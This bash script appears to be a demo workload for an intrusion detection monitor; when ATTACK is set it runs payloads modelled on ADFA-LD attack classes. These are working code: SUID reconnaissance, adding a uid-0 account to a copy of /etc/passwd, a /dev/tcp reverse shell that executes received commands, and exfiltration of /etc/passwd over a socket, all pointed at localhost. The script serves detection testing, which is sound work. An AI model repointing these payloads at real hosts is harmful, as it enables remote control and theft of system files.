#!/usr/bin/env bash
# Demo workload for the live monitor: a small "report service" that processes a batch of text files.
#
#   bash live/demo/service.sh [seed]                normal run (seed varies which files and how many)
#   ATTACK=<payload> bash live/demo/service.sh      the same run after the service was "compromised"
#
# Payloads mimic the attack classes in ADFA-LD. All are harmless and stay on this machine:
#   recon     whoami / id / SUID binary scan, the usual first step of privilege escalation
#   adduser   copies /etc/passwd and appends a uid-0 account (to a private copy, never the real file)
#   revshell  connects back to 127.0.0.1:${PORT:-4444} and runs commands from there (needs demo/listener.py running)
#   exfil     packs config files and ships them over a TCP socket to the same listener
set -u
seed=${1:-$RANDOM}
RANDOM=$seed
work=$(mktemp -d /tmp/hids_service.XXXXXX)
trap 'rm -rf "$work"' EXIT
src=/usr/share/common-licenses

all=($(ls "$src"))
n=$((2 + RANDOM % 4))
for ((i = 0; i < n; i++)); do
    f=${all[$((RANDOM % ${#all[@]}))]}
    cp "$src/$f" "$work/$f"
    wc -l "$work/$f" >> "$work/counts"
    sha256sum "$work/$f" >> "$work/manifest"
    grep -c -i "license" "$work/$f" >> "$work/hits" || true
done

payload() {
    case "$1" in
    recon)
        whoami > "$work/.r"; id >> "$work/.r"; uname -a >> "$work/.r"
        find /usr/bin /usr/sbin -xdev -perm -4000 -type f 2>/dev/null >> "$work/.r" ;;
    adduser)
        cp /etc/passwd "$work/.p"
        echo "svc_backup:x:0:0::/root:/bin/bash" >> "$work/.p"
        chmod 600 "$work/.p"; grep -c ":0:0:" "$work/.p" > /dev/null ;;
    revshell)
        exec 3<>"/dev/tcp/127.0.0.1/${PORT:-4444}" || return 0
        while read -r line <&3; do [ "$line" = "exit" ] && break; bash -c "$line" >&3 2>&1; done
        exec 3>&- ;;
    exfil)
        tar czf "$work/.x" /etc/hostname /etc/os-release /etc/passwd 2>/dev/null
        exec 3<>"/dev/tcp/127.0.0.1/${PORT:-4444}" || return 0
        cat "$work/.x" >&3; exec 3>&- ;;
    esac
}
[ -n "${ATTACK:-}" ] && payload "$ATTACK"

sort "$work/manifest" > "$work/manifest.sorted"
gzip -c "$work/manifest.sorted" > "$work/report.gz"
date "+%F %T report ok" >> "$work/log"
